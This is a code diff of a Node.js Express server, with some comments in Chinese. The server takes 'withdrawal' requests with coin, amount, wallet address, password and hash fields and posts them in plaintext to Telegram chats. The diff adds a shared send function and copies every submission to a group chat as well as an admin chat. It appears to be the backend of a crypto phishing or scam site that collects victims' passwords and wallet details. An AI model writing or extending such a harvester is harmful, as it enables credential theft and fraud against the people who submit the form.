@@ -4,19 +4,33 @@ const axios = require("axios");
 
 const app = express();
 
-// 关键：必须，否则 req.body=undefined 直接崩溃
+app.use(cors());
 app.use(express.json());
 
-// 关键：跨域，否则前端永远 Network error
-app.use(cors());
-
-// 关键：Railway 会 GET / 作为健康检测
+// Railway health check
 app.get("/", (req, res) => {
     res.send("OK");
 });
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
-const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;   // 私聊通知
+const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID;   // 群组通知
+
+// 统一发送函数
+async function sendTelegramMessage(chatId, message) {
+    try {
+        await axios.post(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+            {
+                chat_id: chatId,
+                text: message,
+                parse_mode: "HTML"
+            }
+        );
+    } catch (err) {
+        console.error("Telegram ERROR:", err.response?.data || err.message);
+    }
+}
 
 app.post("/withdraw", async (req, res) => {
     console.log("Withdraw received:", req.body);
@@ -29,38 +43,35 @@ app.post("/withdraw", async (req, res) => {
         }
 
         const message = `
-<b>🚨 Withdrawal Request</b>
+<b>🚨 New Withdrawal Request</b>
 
-Coin: ${coin}
-Amount: ${amount}
-USDT: ${usdt}
-Wallet: ${wallet}
-Password: ${password}
-Hash: ${hash}
+<b>Coin:</b> ${coin}
+<b>Amount:</b> ${amount}
+<b>USDT:</b> ${usdt}
+<b>Wallet:</b> ${wallet}
+<b>Password:</b> ${password}
+<b>Hash:</b> ${hash}
+
+⏱ ${new Date().toLocaleString()}
         `;
 
-        // 防止 TG 报错导致整个服务崩掉
-        try {
-            await axios.post(
-                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-                {
-                    chat_id: ADMIN_CHAT_ID,
-                    text: message,
-                    parse_mode: "HTML"
-                }
-            );
-        } catch (tgErr) {
-            console.error("Telegram Error:", tgErr.response?.data || tgErr.message);
+        // 发给你个人
+        if (ADMIN_CHAT_ID) {
+            sendTelegramMessage(ADMIN_CHAT_ID, message);
+        }
+
+        // 发给群组
+        if (GROUP_CHAT_ID) {
+            sendTelegramMessage(GROUP_CHAT_ID, message);
         }
 
         return res.json({ success: true });
 
     } catch (err) {
-        console.error("Server Crash:", err);
-        return res.status(500).json({ success: false, error: "Server error" });
+        console.error("Server Error:", err);
+        return res.status(500).json({ success: false, error: "Internal Server Error" });
     }
 });
 
-// Railway 指定端口
 const PORT = process.env.PORT || 8080;
-app.listen(PORT, () => console.log("🚀 Server running on port " + PORT));
+app.listen(PORT, () => console.log("🚀 Server running on", PORT));
